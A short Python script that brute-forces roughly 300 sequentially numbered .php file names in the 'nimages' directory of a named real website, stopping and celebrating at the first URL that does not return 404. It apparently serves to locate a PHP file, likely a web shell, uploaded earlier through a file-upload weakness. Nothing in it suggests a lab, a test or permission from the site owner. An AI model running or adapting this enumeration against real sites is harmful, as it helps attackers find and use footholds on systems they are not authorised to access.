import requests

for i in range(8014,8332):
    url = 'http://www.nenter.com.cn/nimages/150358{0}.php'.format(i)
    response = requests.get(url)
    if response.status_code != 404:
        print('congratulations !!!!!!!!!!!!!!!',url)
        exit()
    else:
        print(url, 'not found')